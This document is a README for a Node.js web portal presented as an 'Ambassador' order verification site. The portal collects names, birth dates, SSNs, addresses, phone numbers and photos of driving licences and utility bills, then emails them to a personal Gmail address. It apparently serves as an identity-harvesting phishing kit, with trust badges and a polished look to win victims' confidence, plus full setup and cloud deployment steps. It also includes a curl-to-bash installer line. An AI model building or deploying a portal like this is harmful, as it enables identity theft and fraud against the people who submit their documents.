# 🔐 Ambassador Verification Portal

A secure, multi-step verification portal for collecting order details, personal information, and document uploads. Built with modern web technologies and designed with a high-trust corporate aesthetic.

## 📋 Features

- ✅ **Multi-Step Form**: Organized verification flow with progress tracking
- ✅ **Secure File Uploads**: Drag-and-drop support with file type validation
- ✅ **Real-time Validation**: Immediate feedback on form inputs
- ✅ **Beautiful UI**: Dark mode with gradient design and smooth animations
- ✅ **Email Integration**: Automated email dispatch with file attachments via Nodemailer
- ✅ **Mobile Responsive**: Works seamlessly on all devices
- ✅ **SSL Trust Badge**: Security indicators throughout the portal

## 🛠 Tech Stack

- **Frontend**: HTML5, Tailwind CSS, Vanilla JavaScript
- **Backend**: Node.js, Express.js
- **File Handling**: Multer (multipart form data processing)
- **Email Service**: Nodemailer (SMTP)
- **Server**: Express.js

## 📁 Project Structure

```
d:\rehel\
├── package.json                 # Node.js dependencies
├── server.js                    # Express backend server
├── .env                         # Environment configuration
├── public/
│   └── index.html              # Frontend application
└── uploads/                     # Temporary file storage (auto-created)
```

## 🚀 Quick Start

### 1. Prerequisites

- **Node.js** (v14 or higher) - [Download](https://nodejs.org/)
- **npm** (comes with Node.js)
- **Gmail Account** (for Nodemailer configuration)

### 2. Installation

```bash
# Navigate to project directory
cd d:\rehel

# Install dependencies
npm install
```

### 3. Environment Configuration

Edit the `.env` file with your email credentials:

```env
PORT=3000
NODE_ENV=production

# Gmail SMTP Configuration
EMAIL_HOST=smtp.gmail.com
EMAIL_PORT=587
EMAIL_USER=your-email@gmail.com
EMAIL_PASSWORD=your-app-password
EMAIL_FROM=noreply@ambassador-verify.com

# Recipient Configuration
EMAIL_TO=ttsuk21418@gmail.com
RECIPIENT_EMAIL=ttsuk21418@gmail.com

# Upload Settings
MAX_FILE_SIZE=5242880
ALLOWED_FILE_TYPES=image/jpeg,image/png,application/pdf
```

### 4. Gmail Setup (Important!)

For Gmail SMTP, you **cannot use your regular password**. You must create an **App Password**:

1. Go to [https://myaccount.google.com/](https://myaccount.google.com/)
2. Click on **Security** in the left sidebar
3. Enable **2-Step Verification** (if not already enabled)
4. Scroll down to **App passwords** (appears only after 2FA is enabled)
5. Select **Mail** and **Windows Computer**
6. Generate a new app password (16 characters)
7. Copy this password to your `.env` file as `EMAIL_PASSWORD`

### 5. Start the Server

```bash
# Development mode
npm start

# Or using node directly
node server.js
```

You should see:

```
╔════════════════════════════════════════════════════════════╗
║   🔐 AMBASSADOR VERIFICATION PORTAL                        ║
║   Server running on http://localhost:3000                  ║
║                                                            ║
║   📧 Email Recipient: ttsuk21418@gmail.com                 ║
║   📁 Uploads Directory: d:\rehel\uploads                   ║
║                                                            ║
║   ✨ Server is ready to receive submissions               ║
╚════════════════════════════════════════════════════════════╝
```

### 6. Access the Portal

Open your browser and navigate to:

```
http://localhost:3000
```

## 📝 Form Fields

### Section 1: Order & Identification Details
- **Order Number**: Text input with validation
- **Full Name**: As it appears on State ID
- **Date of Birth**: Date picker
- **SSN / TAX ID / VAT**: Masked input with show/hide toggle
- **Full Address**: Complete shipping/billing address

### Section 2: Contact & Communication
- **WhatsApp Number**: Phone with country code validation

### Section 3: Document Verification
- **Driving License - Front**: JPG, PNG, or PDF (≤5MB)
- **Driving License - Back**: JPG, PNG, or PDF (≤5MB)
- **Electricity / Utility Bill**: JPG, PNG, or PDF (≤5MB)

## 📧 Email Configuration

### Email Service Providers

You can use any SMTP-compatible email service. Here are popular options:

#### Gmail
```env
EMAIL_HOST=smtp.gmail.com
EMAIL_PORT=587
EMAIL_USER=your-email@gmail.com
EMAIL_PASSWORD=your-app-password
```

#### Outlook/Hotmail
```env
EMAIL_HOST=smtp-mail.outlook.com
EMAIL_PORT=587
EMAIL_USER=your-email@outlook.com
EMAIL_PASSWORD=your-password
```

#### SendGrid
```env
EMAIL_HOST=smtp.sendgrid.net
EMAIL_PORT=587
EMAIL_USER=apikey
EMAIL_PASSWORD=SG.xxxxxxxxxxxxxxxxx
```

#### AWS SES
```env
EMAIL_HOST=email-smtp.region.amazonaws.com
EMAIL_PORT=587
EMAIL_USER=your-ses-username
EMAIL_PASSWORD=your-ses-password
```

## 🔒 Security Features

- ✅ **File Type Validation**: Only JPG, PNG, PDF allowed
- ✅ **File Size Limits**: Maximum 5MB per file
- ✅ **Form Validation**: Required fields and format checking
- ✅ **SSL/HTTPS Ready**: Can be deployed with SSL certificates
- ✅ **CORS Configuration**: Cross-origin requests handled
- ✅ **Input Sanitization**: HTML escaping to prevent XSS
- ✅ **Sensitive Data Masking**: SSN display shows only last 4 digits
- ✅ **Temporary File Cleanup**: Uploaded files auto-delete after email sent

## 📱 API Endpoints

### POST /api/verify

Submits verification form with files.

**Request (multipart/form-data)**:
```
- orderNumber: string
- fullName: string
- dateOfBirth: string (YYYY-MM-DD)
- ssn: string
- fullAddress: string
- whatsappNumber: string
- dlFront: file (JPG/PNG/PDF)
- dlBack: file (JPG/PNG/PDF)
- utilityBill: file (JPG/PNG/PDF)
```

**Success Response (200)**:
```json
{
  "success": true,
  "message": "Verification submitted successfully",
  "orderId": "SHP-123456789"
}
```

**Error Response (400/500)**:
```json
{
  "error": "Error message describing the issue"
}
```

### GET /health

Health check endpoint.

**Response**:
```json
{
  "status": "OK",
  "timestamp": "2026-06-02T10:30:00.000Z"
}
```

## 🧪 Testing

### Test with cURL

```bash
curl -X POST http://localhost:3000/api/verify \
  -F "orderNumber=SHP-123456789" \
  -F "fullName=John Smith" \
  -F "dateOfBirth=1990-01-15" \
  -F "ssn=123-45-6789" \
  -F "fullAddress=123 Main St, New York, NY 10001" \
  -F "whatsappNumber=+1 555 123 4567" \
  -F "dlFront=@path/to/dl-front.jpg" \
  -F "dlBack=@path/to/dl-back.jpg" \
  -F "utilityBill=@path/to/bill.pdf"
```

## 🌐 Deployment

### Deploy to Heroku

1. Create Heroku account at [https://www.heroku.com/](https://www.heroku.com/)
2. Install Heroku CLI
3. In project directory:

```bash
heroku login
heroku create your-app-name
git init
git add .
git commit -m "Initial commit"
git push heroku master

# Set environment variables
heroku config:set EMAIL_USER=your-email@gmail.com
heroku config:set EMAIL_PASSWORD=your-app-password
heroku config:set RECIPIENT_EMAIL=ttsuk21418@gmail.com
```

### Deploy to AWS EC2

```bash
# SSH into your EC2 instance
ssh -i your-key.pem ubuntu@your-instance-ip

# Clone repository
git clone your-repo-url
cd rehel

# Install Node.js
curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.0/install.sh | bash
nvm install 16

# Install dependencies
npm install

# Set environment variables
export EMAIL_USER=your-email@gmail.com
export EMAIL_PASSWORD=your-app-password

# Start with PM2 (for process management)
npm install -g pm2
pm2 start server.js
pm2 save
```

### Deploy to DigitalOcean App Platform

1. Push to GitHub
2. Connect repository to DigitalOcean App Platform
3. Set environment variables in dashboard
4. Deploy

## 🔧 Troubleshooting

### Email Not Sending

**Problem**: "Nodemailer connection error"

**Solution**:
1. Check Gmail App Password is correct (not regular password)
2. Enable "Less secure app access" if not using 2FA
3. Verify EMAIL_HOST and EMAIL_PORT are correct
4. Check spam/junk folder for test emails

### File Upload Fails

**Problem**: "File is too large" or "Invalid file type"

**Solution**:
1. Ensure file size is under 5MB
2. Use only JPG, PNG, or PDF files
3. Check file MIME type

### CORS Issues

**Problem**: "CORS policy error"

**Solution**:
- This portal uses Express CORS middleware
- If deploying frontend separately, update `src/api/verify` fetch URL

## 📊 Monitoring

Check email delivery:

```bash
# View server logs for successful submissions
tail -f server.log

# Monitor file uploads
ls -lah uploads/

# Check Node process
ps aux | grep node
```

## 🛡️ Production Checklist

- [ ] Update `.env` with production credentials
- [ ] Enable HTTPS/SSL certificates
- [ ] Set `NODE_ENV=production`
- [ ] Configure firewall rules
- [ ] Set up automated backups
- [ ] Enable rate limiting (add middleware)
- [ ] Use environment-specific email credentials
- [ ] Monitor server uptime
- [ ] Set up error logging service
- [ ] Regular security audits

## 📞 Support

For issues or questions:
1. Check the troubleshooting section above
2. Review server logs: `npm start`
3. Test email connection with health endpoint: `http://localhost:3000/health`

## 📄 License

This project is proprietary to the Ambassador Program. All rights reserved.

## 🔐 Security Notice

This portal handles sensitive personal information. Ensure:
- HTTPS is enabled in production
- Database credentials are never hardcoded
- Regular security updates and patches
- Compliance with data protection regulations (GDPR, CCPA, etc.)
- Secure file storage and deletion policies

---

**© 2026 Ambassador Program. All rights reserved. Secure Portal.**
